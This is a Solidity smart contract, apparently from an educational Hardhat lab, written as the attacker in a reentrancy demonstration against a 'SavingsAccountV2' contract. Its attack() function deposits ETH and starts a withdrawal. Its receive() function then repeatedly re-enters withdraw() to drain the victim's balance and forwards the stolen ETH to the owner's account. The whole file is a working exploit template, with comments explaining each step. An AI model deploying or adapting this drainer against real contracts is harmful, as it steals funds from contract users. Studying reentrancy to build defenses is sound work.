// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

// ATTACKER CONTRACT //

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface ISavingsAccountV2 {
  function deposit() external payable;
  function withdraw() external;
}

contract InvestorV2 is Ownable {
  ISavingsAccountV2 public immutable savingsAccountV2;
  uint private fundedAmountETH;

  constructor(address savingsAccountV2ContractAddress) {
    savingsAccountV2 = ISavingsAccountV2(savingsAccountV2ContractAddress);
  }

  // attack() function will be the starting point of the attack!
  // The attacker will send a transaction with enough gas to this function, and the receive() function will perform the reentrancy logic
  function attack() external payable onlyOwner {
    fundedAmountETH = msg.value;
    savingsAccountV2.deposit{ value: msg.value }(); // Deposit some ETH on the SavingsAccountV2 contract - The higher the ETH that is deposited, the more ETH will be taken on each reentrant call
    savingsAccountV2.withdraw();  // Immediately call the withdraw() function to start depleting the ETH balance from the victim contract
  }

  // receive() function performs the reentrancy logic until all the ETH balance of the victim contract is depleted
  receive() external payable {
    // Validates if the victim's contract ETH Balance is greater than the amount of ETH that the reentrant call will take
    // If the reamining ETH on the victim contract is less than the ETH the reentrant call will take, an error will occur, and all the changes will be reverted!
        // Error: VM Exception while processing transaction: reverted with reason string 'Address: unable to send value, recipient may have reverted'
    if (address(savingsAccountV2).balance > fundedAmountETH) {
    // if (address(savingsAccountV2).balance > 0) {
      console.log("");
      console.log("From Attacker contract: Reentring the Victim Contract");

      // reentrant the withdraw() function from the victim contract to keep draining ETHs 
      savingsAccountV2.withdraw();
    } else {
      console.log("");
      console.log("Victim Contract's ETH Balance has been depleted");
      // When the victim contract has no more ETHs, the attack is completed, and all the ETH that was taken during the attack will be sent to the attacker's account! 
      //payable(owner()).transfer(address(this).balance);
      (bool success, ) = payable(owner()).call{value: address(this).balance }("");
      require(success, "Error when sending the ETH from the Attacker contract to the attacker's account");
    }
  }

}